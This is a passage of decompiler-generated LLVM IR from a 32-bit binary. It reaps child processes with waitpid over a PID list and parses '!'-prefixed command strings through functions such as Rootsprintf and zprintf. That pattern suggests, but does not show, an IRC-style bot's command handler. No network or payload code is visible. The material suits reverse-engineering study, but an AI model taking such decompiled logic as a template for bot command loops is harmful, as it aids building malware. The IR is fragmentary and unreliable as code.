  store i32 ptrtoint (i32* @global_var_8056728.180 to i32), i32* %v2_804cff3, align 4
  %v0_804cff8 = load i32, i32* %edx.global-to-local, align 4
  %v3_804cff8 = inttoptr i32 %v0_804cfe8 to i32*
  store i32 %v0_804cff8, i32* %v3_804cff8, align 4
  %v0_804cff9 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804cff9 = ptrtoint i8* %v0_804cff9 to i32
  %v3_804cff9 = call i32 @Rootsprintf(i32 %v1_804cff9, i32 1)
  store i32 %v3_804cff9, i32* %eax.global-to-local, align 4
  %v0_804cffe = load i32, i32* @esp, align 4
  %v2_804cffe = icmp ugt i32 %v0_804cffe, -17
  store i1 %v2_804cffe, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d673.outer

dec_label_pc_804d020:                             ; preds = %dec_label_pc_804d215, %dec_label_pc_804d1c9
  %v2_804d023 = mul i32 %storemerge17, 4
  store i32 %v2_804d023, i32* %edx.global-to-local, align 4
  %v0_804d028 = load i32, i32* @global_var_805fd94.34, align 4
  %v2_804d02d = add i32 %v0_804d028, %v2_804d023
  store i32 %v2_804d02d, i32* %eax.global-to-local, align 4
  %v1_804d030 = inttoptr i32 %v2_804d02d to i32*
  %v2_804d030 = load i32, i32* %v1_804d030, align 4
  store i32 %v2_804d030, i32* %eax.global-to-local, align 4
  %tmp283 = and i32 %v0_804d032.in, -4
  %v5_804d032 = icmp eq i32 %tmp283, -16
  store i1 %v5_804d032, i1* %cf.global-to-local, align 1
  %v1_804d035 = add i32 %v0_804d032.in, 8
  %v2_804d035 = inttoptr i32 %v1_804d035 to i32*
  store i32 1, i32* %v2_804d035, align 4
  %v1_804d037 = add i32 %v0_804d032.in, 4
  %v2_804d037 = inttoptr i32 %v1_804d037 to i32*
  store i32 0, i32* %v2_804d037, align 4
  %v0_804d039 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d039 = inttoptr i32 %v0_804d032.in to i32*
  store i32 %v0_804d039, i32* %v3_804d039, align 4
  %v4_804d03a = call i32 @__libc_waitpid(i32 %storemerge17, i32 %v2_804d03a, i32 %stack_var_-60.2)
  store i32 %v4_804d03a, i32* %eax.global-to-local, align 4
  %v0_804d03f = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp192 = icmp slt i32 %v4_804d03a, 1
  %.pre = add i32 %storemerge17, 1
  br i1 %tmp192, label %dec_label_pc_804d1c6, label %dec_label_pc_804d04a

dec_label_pc_804d04a:                             ; preds = %dec_label_pc_804d020
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d07d

dec_label_pc_804d053:                             ; preds = %dec_label_pc_804d07d, %dec_label_pc_804d0b7
  %v2_804d056 = mul i32 %storemerge19, 4
  %v0_804d05b = load i32, i32* @global_var_805fd94.34, align 4
  %v2_804d060 = add i32 %v0_804d05b, %v2_804d056
  %v1_804d063 = add i32 %v2_804d060, -4
  store i32 %v2_804d056, i32* %edx.global-to-local, align 4
  store i32 %v2_804d060, i32* %eax.global-to-local, align 4
  %v1_804d076 = inttoptr i32 %v2_804d060 to i32*
  %v2_804d076 = load i32, i32* %v1_804d076, align 4
  store i32 %v2_804d076, i32* %eax.global-to-local, align 4
  %v2_804d078 = inttoptr i32 %v1_804d063 to i32*
  store i32 %v2_804d076, i32* %v2_804d078, align 4
  %v4_804d07a = add i32 %storemerge19, 1
  br label %dec_label_pc_804d07d

dec_label_pc_804d07d:                             ; preds = %dec_label_pc_804d04a, %dec_label_pc_804d053
  %storemerge19 = phi i32 [ %v4_804d07a, %dec_label_pc_804d053 ], [ %.pre, %dec_label_pc_804d04a ]
  store i32 %storemerge19, i32* %eax.global-to-local, align 4
  %v0_804d091 = load i32, i32* @global_var_8059b08.32, align 8
  store i32 %v0_804d091, i32* %edx.global-to-local, align 4
  %v0_804d097 = load i32, i32* @global_var_8059b0c.33, align 4
  %v10_804d0af = icmp eq i32 %v0_804d097, 0
  br i1 %v10_804d0af, label %dec_label_pc_804d0b7, label %dec_label_pc_804d053

dec_label_pc_804d0b7:                             ; preds = %dec_label_pc_804d07d
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d091, i32* @edi, align 4
  %v10_804d0cb = icmp ult i32 %storemerge19, %v0_804d091
  br i1 %v10_804d0cb, label %dec_label_pc_804d053, label %dec_label_pc_804d0d3

dec_label_pc_804d0d3:                             ; preds = %dec_label_pc_804d0b7
  %v2_804d0d6 = mul i32 %storemerge19, 4
  %v0_804d0db = load i32, i32* @global_var_805fd94.34, align 4
  %v2_804d0e0 = add i32 %v2_804d0d6, -4
  %v1_804d0e3 = add i32 %v2_804d0e0, %v0_804d0db
  %v1_804d0e6 = inttoptr i32 %v1_804d0e3 to i32*
  store i32 0, i32* %v1_804d0e6, align 4
  %v0_804d0ec = load i32, i32* @global_var_8059b08.32, align 8
  %v0_804d0f1 = load i32, i32* @global_var_8059b0c.33, align 4
  %v1_804d0f7 = add i32 %v0_804d0ec, -1
  %v4_804d0f7 = icmp ne i32 %v0_804d0ec, 0
  %v2_804d0fa = zext i1 %v4_804d0f7 to i32
  %v3_804d0fa = add i32 %v0_804d0f1, -1
  %v4_804d0fa = add i32 %v3_804d0fa, %v2_804d0fa
  store i32 %v1_804d0f7, i32* @global_var_8059b08.32, align 8
  store i32 %v4_804d0fa, i32* @global_var_8059b0c.33, align 4
  %v3_804d113 = mul i32 %v4_804d0fa, 4
  %v4_804d113 = udiv i32 %v1_804d0f7, 1073741824
  %v5_804d113 = or i32 %v3_804d113, %v4_804d113
  store i32 %v5_804d113, i32* %edx.global-to-local, align 4
  %v2_804d117 = mul i32 %v1_804d0f7, 4
  %v1_804d11a = add i32 %v2_804d117, 4
  store i32 %v1_804d11a, i32* %eax.global-to-local, align 4
  %v0_804d11d = load i32, i32* @esp, align 4
  %v5_804d11d = icmp ult i32 %v0_804d11d, 12
  store i1 %v5_804d11d, i1* %cf.global-to-local, align 1
  %v2_804d120 = add i32 %v0_804d11d, -16
  %v3_804d120 = inttoptr i32 %v2_804d120 to i32*
  store i32 %v1_804d11a, i32* %v3_804d120, align 4
  %v1_804d121 = call i32 @malloc(i32 0)
  store i32 %v1_804d121, i32* %eax.global-to-local, align 4
  %v0_804d126 = load i32, i32* @esp, align 4
  %v2_804d126 = icmp ugt i32 %v0_804d126, -17
  store i1 %v2_804d126, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d157

dec_label_pc_804d135:                             ; preds = %dec_label_pc_804d157, %dec_label_pc_804d191
  %v2_804d138 = mul i32 %storemerge18, 4
  %v5_804d13d = add i32 %v2_804d138, %v1_804d121
  store i32 %v2_804d138, i32* %edx.global-to-local, align 4
  %v0_804d148 = load i32, i32* @global_var_805fd94.34, align 4
  %v2_804d14d = add i32 %v0_804d148, %v2_804d138
  store i32 %v2_804d14d, i32* %eax.global-to-local, align 4
  %v1_804d150 = inttoptr i32 %v2_804d14d to i32*
  %v2_804d150 = load i32, i32* %v1_804d150, align 4
  store i32 %v2_804d150, i32* %eax.global-to-local, align 4
  %v2_804d152 = inttoptr i32 %v5_804d13d to i32*
  store i32 %v2_804d150, i32* %v2_804d152, align 4
  %v4_804d154 = add i32 %storemerge18, 1
  br label %dec_label_pc_804d157

dec_label_pc_804d157:                             ; preds = %dec_label_pc_804d0d3, %dec_label_pc_804d135
  %storemerge18 = phi i32 [ %v4_804d154, %dec_label_pc_804d135 ], [ 0, %dec_label_pc_804d0d3 ]
  store i32 %storemerge18, i32* %eax.global-to-local, align 4
  %v0_804d16b = load i32, i32* @global_var_8059b08.32, align 8
  store i32 %v0_804d16b, i32* %edx.global-to-local, align 4
  %v0_804d171 = load i32, i32* @global_var_8059b0c.33, align 4
  %v10_804d189 = icmp eq i32 %v0_804d171, 0
  br i1 %v10_804d189, label %dec_label_pc_804d191, label %dec_label_pc_804d135

dec_label_pc_804d191:                             ; preds = %dec_label_pc_804d157
  store i32 0, i32* @esi, align 4
  store i32 %v0_804d16b, i32* @edi, align 4
  %v10_804d1a5 = icmp ult i32 %storemerge18, %v0_804d16b
  br i1 %v10_804d1a5, label %dec_label_pc_804d135, label %dec_label_pc_804d1ad

dec_label_pc_804d1ad:                             ; preds = %dec_label_pc_804d191
  %v0_804d1ad = load i32, i32* @global_var_805fd94.34, align 4
  store i32 %v0_804d1ad, i32* %eax.global-to-local, align 4
  %v0_804d1b2 = load i32, i32* @esp, align 4
  %v5_804d1b2 = icmp ult i32 %v0_804d1b2, 12
  store i1 %v5_804d1b2, i1* %cf.global-to-local, align 1
  %v2_804d1b5 = add i32 %v0_804d1b2, -16
  %v3_804d1b5 = inttoptr i32 %v2_804d1b5 to i32*
  store i32 %v0_804d1ad, i32* %v3_804d1b5, align 4
  %v1_804d1b6 = call i32 @free(i32 0)
  %v0_804d1bb = load i32, i32* @esp, align 4
  %v2_804d1bb = icmp ugt i32 %v0_804d1bb, -17
  store i1 %v2_804d1bb, i1* %cf.global-to-local, align 1
  store i32 %v1_804d121, i32* %eax.global-to-local, align 4
  store i32 %v1_804d121, i32* @global_var_805fd94.34, align 4
  br label %dec_label_pc_804d1c6

dec_label_pc_804d1c6:                             ; preds = %dec_label_pc_804d020, %dec_label_pc_804d1ad
  %v0_804d032104.in = phi i32 [ %v0_804d1bb, %dec_label_pc_804d1ad ], [ %v0_804d03f, %dec_label_pc_804d020 ]
  %stack_var_-60.1 = phi i32 [ %v1_804d121, %dec_label_pc_804d1ad ], [ %stack_var_-60.2, %dec_label_pc_804d020 ]
  br label %dec_label_pc_804d1c9

dec_label_pc_804d1c9:                             ; preds = %dec_label_pc_804d673, %dec_label_pc_804d1c6
  %v0_804d032.in = phi i32 [ %v0_804d032104.in, %dec_label_pc_804d1c6 ], [ %v0_804d68e, %dec_label_pc_804d673 ]
  %stack_var_-60.2 = phi i32 [ %stack_var_-60.1, %dec_label_pc_804d1c6 ], [ %stack_var_-60.3, %dec_label_pc_804d673 ]
  %storemerge17 = phi i32 [ %.pre, %dec_label_pc_804d1c6 ], [ 0, %dec_label_pc_804d673 ]
  store i32 %storemerge17, i32* %eax.global-to-local, align 4
  %v2_804d1d4 = ashr i32 %storemerge17, 31
  store i32 %v2_804d1d4, i32* %edx.global-to-local, align 4
  %v0_804d1dd = load i32, i32* @global_var_8059b08.32, align 8
  store i32 %v0_804d1dd, i32* @esi, align 4
  %v0_804d1e3 = load i32, i32* @global_var_8059b0c.33, align 4
  store i32 %v0_804d1e3, i32* @edi, align 4
  %v10_804d1fb = icmp ult i32 %v2_804d1d4, %v0_804d1e3
  store i1 %v10_804d1fb, i1* %cf.global-to-local, align 1
  br i1 %v10_804d1fb, label %dec_label_pc_804d020, label %dec_label_pc_804d207

dec_label_pc_804d207:                             ; preds = %dec_label_pc_804d1c9
  store i32 %v0_804d1e3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_804d213 = icmp ugt i32 %v2_804d1d4, %v0_804d1e3
  br i1 %v6_804d213, label %dec_label_pc_804d227, label %dec_label_pc_804d215

dec_label_pc_804d215:                             ; preds = %dec_label_pc_804d207
  store i32 %v0_804d1dd, i32* %edx.global-to-local, align 4
  %v10_804d21b = icmp ult i32 %storemerge17, %v0_804d1dd
  store i1 %v10_804d21b, i1* %cf.global-to-local, align 1
  br i1 %v10_804d21b, label %dec_label_pc_804d020, label %dec_label_pc_804d227

dec_label_pc_804d227:                             ; preds = %dec_label_pc_804d215, %dec_label_pc_804d207
  %v0_804d22a = load i32, i32* @ebp, align 4
  %v2_804d22a = add i32 %v0_804d689, -5736
  %v3_804d22a = add i32 %v2_804d22a, %v0_804d22a
  %v4_804d22a = inttoptr i32 %v3_804d22a to i8*
  store i8 0, i8* %v4_804d22a, align 1
  %v0_804d232 = load i32, i32* @esp, align 4
  %v5_804d232 = icmp ult i32 %v0_804d232, 12
  store i1 %v5_804d232, i1* %cf.global-to-local, align 1
  store i32 %v2_804d673, i32* %eax.global-to-local, align 4
  %v2_804d23b = add i32 %v0_804d232, -16
  %v3_804d23b = inttoptr i32 %v2_804d23b to i32*
  store i32 %v2_804d673, i32* %v3_804d23b, align 4
  %v0_804d23c = call i32 @trim()
  %v0_804d241 = load i32, i32* @esp, align 4
  %tmp277 = and i32 %v0_804d241, -8
  %v5_804d244 = icmp eq i32 %tmp277, -16
  store i1 %v5_804d244, i1* %cf.global-to-local, align 1
  %v1_804d247 = add i32 %v0_804d241, 4
  %v2_804d247 = inttoptr i32 %v1_804d247 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80561a0.19 to i32), i32* %v2_804d247, align 4
  store i32 %v2_804d673, i32* %eax.global-to-local, align 4
  %v3_804d252 = inttoptr i32 %v0_804d241 to i32*
  store i32 %v2_804d673, i32* %v3_804d252, align 4
  %v3_804d253 = call i32 @strstr(i32 %v0_804d1e3, i8* bitcast (i32* @0 to i8*))
  %v0_804d258 = load i32, i32* @esp, align 4
  %v1_804d258 = add i32 %v0_804d258, 16
  store i32 %v3_804d253, i32* %edx.global-to-local, align 4
  store i32 %v2_804d673, i32* %eax.global-to-local, align 4
  %v7_804d263 = icmp ult i32 %v3_804d253, %v2_804d673
  store i1 %v7_804d263, i1* %cf.global-to-local, align 1
  %v12_804d263 = icmp eq i32 %v3_804d253, %v2_804d673
  %v1_804d265 = icmp eq i1 %v12_804d263, false
  br i1 %v1_804d265, label %dec_label_pc_804d282, label %dec_label_pc_804d267

dec_label_pc_804d267:                             ; preds = %dec_label_pc_804d227
  %v0_804d267 = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804d267, i32* %eax.global-to-local, align 4
  %v5_804d26c = icmp ult i32 %v1_804d258, 8
  store i1 %v5_804d26c, i1* %cf.global-to-local, align 1
  %v1_804d26f = add i32 %v0_804d258, 4
  %v2_804d26f = inttoptr i32 %v1_804d26f to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805678f.181 to i32), i32* %v2_804d26f, align 4
  %v0_804d274 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d274 = inttoptr i32 %v0_804d258 to i32*
  store i32 %v0_804d274, i32* %v3_804d274, align 4
  %v2_804d275 = call i32 @Rootsprintf(i32 %v0_804d1e3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d275, i32* %eax.global-to-local, align 4
  %v0_804d27a = load i32, i32* @esp, align 4
  %v1_804d27a = add i32 %v0_804d27a, 16
  %v2_804d27a = icmp ugt i32 %v0_804d27a, -17
  store i1 %v2_804d27a, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d673

dec_label_pc_804d282:                             ; preds = %dec_label_pc_804d227
  %v5_804d282 = icmp ult i32 %v1_804d258, 8
  store i1 %v5_804d282, i1* %cf.global-to-local, align 1
  %v1_804d285 = add i32 %v0_804d258, 4
  %v2_804d285 = inttoptr i32 %v1_804d285 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8056794.182 to i32), i32* %v2_804d285, align 4
  store i32 %v2_804d673, i32* %eax.global-to-local, align 4
  %v3_804d290 = inttoptr i32 %v0_804d258 to i32*
  store i32 %v2_804d673, i32* %v3_804d290, align 4
  %v3_804d291 = call i32 @strstr(i32 %v0_804d1e3, i8* bitcast (i32* @0 to i8*))
  %v0_804d296 = load i32, i32* @esp, align 4
  store i32 %v3_804d291, i32* @edx, align 4
  store i32 %v2_804d673, i32* %eax.global-to-local, align 4
  %v7_804d2a1 = icmp ult i32 %v3_804d291, %v2_804d673
  store i1 %v7_804d2a1, i1* %cf.global-to-local, align 1
  %v12_804d2a1 = icmp eq i32 %v3_804d291, %v2_804d673
  %v1_804d2a3 = icmp eq i1 %v12_804d2a1, false
  br i1 %v1_804d2a3, label %dec_label_pc_804d2cd, label %dec_label_pc_804d2a5

dec_label_pc_804d2a5:                             ; preds = %dec_label_pc_804d282
  %v1_804d296 = add i32 %v0_804d296, 16
  %v4_804d2a5 = add i32 %stack_var_-96.2.ph34, 1
  store i32 ptrtoint ([20 x i8]* @global_var_805679d.183 to i32), i32* %eax.global-to-local, align 4
  %v5_804d2ad = icmp ult i32 %v1_804d296, 12
  store i1 %v5_804d2ad, i1* %cf.global-to-local, align 1
  %v3_804d2b0 = inttoptr i32 %v0_804d296 to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_805679d.183 to i32), i32* %v3_804d2b0, align 4
  %v1_804d2b1 = call i32 @zprintf(i32 %v4_804d2a5)
  store i32 %v1_804d2b1, i32* @eax, align 4
  %v0_804d2b6 = load i32, i32* @esp, align 4
  %v9_804d2b9 = icmp ult i32 %v4_804d2a5, 20
  store i1 %v9_804d2b9, i1* %cf.global-to-local, align 1
  %v7_804d2bd = icmp sgt i32 %v4_804d2a5, 20
  br i1 %v7_804d2bd, label %dec_label_pc_804d2c3, label %dec_label_pc_804cfbb.outer

dec_label_pc_804d2c3:                             ; preds = %dec_label_pc_804d2a5
  %v1_804d2b6 = add i32 %v0_804d2b6, 16
  %v5_804d2c3 = icmp ult i32 %v1_804d2b6, 12
  store i1 %v5_804d2c3, i1* %cf.global-to-local, align 1
  %v2_804d2c6 = inttoptr i32 %v0_804d2b6 to i32*
  store i32 0, i32* %v2_804d2c6, align 4
  %v1_804d2c8 = call i32 @__GI_exit(i32 %v4_804d2a5)
  store i32 %v1_804d2c8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d2cd

dec_label_pc_804d2cd:                             ; preds = %dec_label_pc_804d282, %dec_label_pc_804d2c3
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph34, %dec_label_pc_804d282 ], [ %v4_804d2a5, %dec_label_pc_804d2c3 ]
  %v2_804d2d9 = load i8, i8* %tmp190, align 4
  %v3_804d2d9 = zext i8 %v2_804d2d9 to i32
  %v6_804d2d9 = or i32 %v3_804d2d9, %v5_804d2d9
  store i32 %v6_804d2d9, i32* %eax.global-to-local, align 4
  %v6_804d2db = icmp ult i8 %v2_804d2d9, 33
  store i1 %v6_804d2db, i1* %cf.global-to-local, align 1
  %v10_804d2db = icmp eq i8 %v2_804d2d9, 33
  %v1_804d2dd = icmp eq i1 %v10_804d2db, false
  br i1 %v1_804d2dd, label %dec_label_pc_804d673.outer31, label %dec_label_pc_804d2e3

dec_label_pc_804d2e3:                             ; preds = %dec_label_pc_804d2cd
  store i32 %v1_804d2e6, i32* %eax.global-to-local, align 4
  %v2_804d2f2210 = load i8, i8* %storemerge16209, align 1
  %v3_804d2f2211 = zext i8 %v2_804d2f2210 to i32
  %v6_804d2f2213 = or i32 %v3_804d2f2211, %v5_804d2d9
  store i32 %v6_804d2f2213, i32* %eax.global-to-local, align 4
  %v3_804d2f4214 = icmp ult i8 %v2_804d2f2210, 32
  store i1 %v3_804d2f4214, i1* %cf.global-to-local, align 1
  %v7_804d2f4215 = icmp eq i8 %v2_804d2f2210, 32
  br i1 %v7_804d2f4215, label %dec_label_pc_804d301, label %dec_label_pc_804d2f8

dec_label_pc_804d2ec:                             ; preds = %dec_label_pc_804d2f8
  %v5_804d2ec = add i32 %storemerge16.in216, 1
  %storemerge16 = inttoptr i32 %v5_804d2ec to i8*
  store i32 %v5_804d2ec, i32* %eax.global-to-local, align 4
  %v2_804d2f2 = load i8, i8* %storemerge16, align 1
  %v3_804d2f2 = zext i8 %v2_804d2f2 to i32
  %v5_804d2f2 = and i32 %v5_804d2ec, -256
  %v6_804d2f2 = or i32 %v3_804d2f2, %v5_804d2f2
  store i32 %v6_804d2f2, i32* %eax.global-to-local, align 4
  %v3_804d2f4 = icmp ult i8 %v2_804d2f2, 32
  store i1 %v3_804d2f4, i1* %cf.global-to-local, align 1
  %v7_804d2f4 = icmp eq i8 %v2_804d2f2, 32
  br i1 %v7_804d2f4, label %dec_label_pc_804d301, label %dec_label_pc_804d2f8

dec_label_pc_804d2f8:                             ; preds = %dec_label_pc_804d2e3, %dec_label_pc_804d2ec
  %v5_804d2f2218 = phi i32 [ %v5_804d2f2, %dec_label_pc_804d2ec ], [ %v5_804d2d9, %dec_label_pc_804d2e3 ]
  %storemerge16217 = phi i8* [ %storemerge16, %dec_label_pc_804d2ec ], [ %storemerge16209, %dec_label_pc_804d2e3 ]
  %storemerge16.in216 = phi i32 [ %v5_804d2ec, %dec_label_pc_804d2ec ], [ %v1_804d2e6, %dec_label_pc_804d2e3 ]
  store i32 %storemerge16.in216, i32* %eax.global-to-local, align 4
  %v2_804d2fb = load i8, i8* %storemerge16217, align 1
  %v3_804d2fb = zext i8 %v2_804d2fb to i32
  %v6_804d2fb = or i32 %v3_804d2fb, %v5_804d2f2218
  store i32 %v6_804d2fb, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d2fd = icmp eq i8 %v2_804d2fb, 0
  %v1_804d2ff = icmp eq i1 %v4_804d2fd, false
  br i1 %v1_804d2ff, label %dec_label_pc_804d2ec, label %dec_label_pc_804d301

dec_label_pc_804d301:                             ; preds = %dec_label_pc_804d2ec, %dec_label_pc_804d2f8, %dec_label_pc_804d2e3
  %storemerge16.in.lcssa = phi i32 [ %v1_804d2e6, %dec_label_pc_804d2e3 ], [ %storemerge16.in216, %dec_label_pc_804d2f8 ], [ %v5_804d2ec, %dec_label_pc_804d2ec ]
  %storemerge16.lcssa = phi i8* [ %storemerge16209, %dec_label_pc_804d2e3 ], [ %storemerge16217, %dec_label_pc_804d2f8 ], [ %storemerge16, %dec_label_pc_804d2ec ]
  %v5_804d2f2.lcssa = phi i32 [ %v5_804d2d9, %dec_label_pc_804d2e3 ], [ %v5_804d2f2218, %dec_label_pc_804d2f8 ], [ %v5_804d2f2, %dec_label_pc_804d2ec ]
  store i32 %storemerge16.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_804d304 = load i8, i8* %storemerge16.lcssa, align 1
  %v3_804d304 = zext i8 %v2_804d304 to i32
  %v6_804d304 = or i32 %v3_804d304, %v5_804d2f2.lcssa
  store i32 %v6_804d304, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d306 = icmp eq i8 %v2_804d304, 0
  br i1 %v4_804d306, label %dec_label_pc_804d673.outer31, label %dec_label_pc_804d30e

dec_label_pc_804d30e:                             ; preds = %dec_label_pc_804d301
  store i8 0, i8* %storemerge16.lcssa, align 1
  store i32 %v5_804d2d9, i32* %eax.global-to-local, align 4
  %v3_804d332 = call i32 @_strlen(i8* %storemerge16209)
  %v6_804d339 = add i32 %v2_804d673, %v3_804d332
  %v1_804d33c = add i32 %v6_804d339, 2
  %v5_804d33c = icmp ugt i32 %v6_804d339, -3
  store i1 %v5_804d33c, i1* %cf.global-to-local, align 1
  store i32 %v1_804d33c, i32* %eax.global-to-local, align 4
  %v5_804d33f = inttoptr i32 %v1_804d33c to i8*
  %v1_804d377 = and i32 %v1_804d33c, -256
  br label %dec_label_pc_804d369

dec_label_pc_804d344:                             ; preds = %dec_label_pc_804d391, %dec_label_pc_804d369
  store i32 %v1_804d377, i32* %eax.global-to-local, align 4
  %v3_804d35b = call i32 @_strlen(i8* %v5_804d33f)
  %v4_804d35b = mul i32 %v3_804d35b, -1
  %v1_804d361 = sub i32 0, %v4_804d35b
  %v6_804d362 = sub i32 %v1_804d33c, %v4_804d35b
  %v11_804d362 = icmp ult i32 %v6_804d362, %v1_804d361
  store i1 %v11_804d362, i1* %cf.global-to-local, align 1
  %v1_804d365 = add i32 %v6_804d362, -1
  store i32 %v1_804d365, i32* %eax.global-to-local, align 4
  %v1_804d366 = inttoptr i32 %v1_804d365 to i8*
  store i8 0, i8* %v1_804d366, align 1
  br label %dec_label_pc_804d369

dec_label_pc_804d369:                             ; preds = %dec_label_pc_804d30e, %dec_label_pc_804d344
  %stack_var_-5832.1 = phi i32 [ %stack_var_-5832.2.ph27, %dec_label_pc_804d30e ], [ %v1_804d33c, %dec_label_pc_804d344 ]
  store i32 %v1_804d377, i32* %eax.global-to-local, align 4
  %v3_804d380 = call i32 @_strlen(i8* %v5_804d33f)
  %v4_804d380 = mul i32 %v3_804d380, -1
  %v1_804d386 = sub i32 0, %v4_804d380
  %v6_804d387 = sub i32 %v1_804d33c, %v4_804d380
  %v11_804d387 = icmp ult i32 %v6_804d387, %v1_804d386
  store i1 %v11_804d387, i1* %cf.global-to-local, align 1
  %v1_804d38a = add i32 %v6_804d387, -1
  store i32 %v1_804d38a, i32* %eax.global-to-local, align 4
  %v1_804d38b = inttoptr i32 %v1_804d38a to i8*
  %v2_804d38b = load i8, i8* %v1_804d38b, align 1
  %v3_804d38b = zext i8 %v2_804d38b to i32
  %v5_804d38b = and i32 %v1_804d38a, -256
  %v6_804d38b = or i32 %v3_804d38b, %v5_804d38b
  store i32 %v6_804d38b, i32* %eax.global-to-local, align 4
  %v6_804d38d = icmp ult i8 %v2_804d38b, 10
  store i1 %v6_804d38d, i1* %cf.global-to-local, align 1
  %v10_804d38d = icmp eq i8 %v2_804d38b, 10
  br i1 %v10_804d38d, label %dec_label_pc_804d344, label %dec_label_pc_804d391

dec_label_pc_804d391:                             ; preds = %dec_label_pc_804d369
  store i32 %v1_804d377, i32* %eax.global-to-local, align 4
  %v3_804d3a8 = call i32 @_strlen(i8* %v5_804d33f)
  %v4_804d3a8 = mul i32 %v3_804d3a8, -1
  %v1_804d3ae = sub i32 0, %v4_804d3a8
  %v6_804d3af = sub i32 %v1_804d33c, %v4_804d3a8
  %v11_804d3af = icmp ult i32 %v6_804d3af, %v1_804d3ae
  store i1 %v11_804d3af, i1* %cf.global-to-local, align 1
  %v1_804d3b2 = add i32 %v6_804d3af, -1
  store i32 %v1_804d3b2, i32* %eax.global-to-local, align 4
  %v1_804d3b3 = inttoptr i32 %v1_804d3b2 to i8*
  %v2_804d3b3 = load i8, i8* %v1_804d3b3, align 1
  %v3_804d3b3 = zext i8 %v2_804d3b3 to i32
  %v5_804d3b3 = and i32 %v1_804d3b2, -256
  %v6_804d3b3 = or i32 %v3_804d3b3, %v5_804d3b3
  store i32 %v6_804d3b3, i32* %eax.global-to-local, align 4
  %v6_804d3b5 = icmp ult i8 %v2_804d3b3, 13
  store i1 %v6_804d3b5, i1* %cf.global-to-local, align 1
  %v10_804d3b5 = icmp eq i8 %v2_804d3b3, 13
  br i1 %v10_804d3b5, label %dec_label_pc_804d344, label %dec_label_pc_804d3b9

dec_label_pc_804d3b9:                             ; preds = %dec_label_pc_804d391
  store i32 %v1_804d33c, i32* %eax.global-to-local, align 4
  %v2_804d3c7225 = load i8, i8* %v5_804d33f, align 1
  %v3_804d3c7226 = zext i8 %v2_804d3c7225 to i32
  %v6_804d3c7228 = or i32 %v3_804d3c7226, %v1_804d377
  store i32 %v6_804d3c7228, i32* %eax.global-to-local, align 4
  %v3_804d3c9229 = icmp ult i8 %v2_804d3c7225, 32
  store i1 %v3_804d3c9229, i1* %cf.global-to-local, align 1
  %v7_804d3c9230 = icmp eq i8 %v2_804d3c7225, 32
  br i1 %v7_804d3c9230, label %dec_label_pc_804d3d6, label %dec_label_pc_804d3cd

dec_label_pc_804d3c1:                             ; preds = %dec_label_pc_804d3cd
  %v5_804d3c1 = add i32 %v4_804d3c4232, 1
  %v22_804d3c1 = inttoptr i32 %v5_804d3c1 to i8*
  store i32 %v5_804d3c1, i32* %eax.global-to-local, align 4
  %v2_804d3c7 = load i8, i8* %v22_804d3c1, align 1
  %v3_804d3c7 = zext i8 %v2_804d3c7 to i32
  %v5_804d3c7 = and i32 %v5_804d3c1, -256
  %v6_804d3c7 = or i32 %v3_804d3c7, %v5_804d3c7
  store i32 %v6_804d3c7, i32* %eax.global-to-local, align 4
  %v3_804d3c9 = icmp ult i8 %v2_804d3c7, 32
  store i1 %v3_804d3c9, i1* %cf.global-to-local, align 1
  %v7_804d3c9 = icmp eq i8 %v2_804d3c7, 32
  br i1 %v7_804d3c9, label %dec_label_pc_804d3d6, label %dec_label_pc_804d3cd

dec_label_pc_804d3cd:                             ; preds = %dec_label_pc_804d3b9, %dec_label_pc_804d3c1
  %v5_804d3c7233 = phi i32 [ %v5_804d3c7, %dec_label_pc_804d3c1 ], [ %v1_804d377, %dec_label_pc_804d3b9 ]
  %v4_804d3c4232 = phi i32 [ %v5_804d3c1, %dec_label_pc_804d3c1 ], [ %v1_804d33c, %dec_label_pc_804d3b9 ]
  %stack_var_-64.1231 = phi i8* [ %v22_804d3c1, %dec_label_pc_804d3c1 ], [ %v5_804d33f, %dec_label_pc_804d3b9 ]
  store i32 %v4_804d3c4232, i32* %eax.global-to-local, align 4
  %v2_804d3d0 = load i8, i8* %stack_var_-64.1231, align 1
  %v3_804d3d0 = zext i8 %v2_804d3d0 to i32
  %v6_804d3d0 = or i32 %v3_804d3d0, %v5_804d3c7233
  store i32 %v6_804d3d0, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d3d2 = icmp eq i8 %v2_804d3d0, 0
  %v1_804d3d4 = icmp eq i1 %v4_804d3d2, false
  br i1 %v1_804d3d4, label %dec_label_pc_804d3c1, label %dec_label_pc_804d3d6

dec_label_pc_804d3d6:                             ; preds = %dec_label_pc_804d3c1, %dec_label_pc_804d3cd, %dec_label_pc_804d3b9
  %stack_var_-64.1.lcssa = phi i8* [ %v5_804d33f, %dec_label_pc_804d3b9 ], [ %stack_var_-64.1231, %dec_label_pc_804d3cd ], [ %v22_804d3c1, %dec_label_pc_804d3c1 ]
  %v4_804d3c4.lcssa = phi i32 [ %v1_804d33c, %dec_label_pc_804d3b9 ], [ %v4_804d3c4232, %dec_label_pc_804d3cd ], [ %v5_804d3c1, %dec_label_pc_804d3c1 ]
  store i8 0, i8* %stack_var_-64.1.lcssa, align 1
  %v5_804d3dc = add i32 %v4_804d3c4.lcssa, 1
  store i32 %v1_804d33c, i32* %eax.global-to-local, align 4
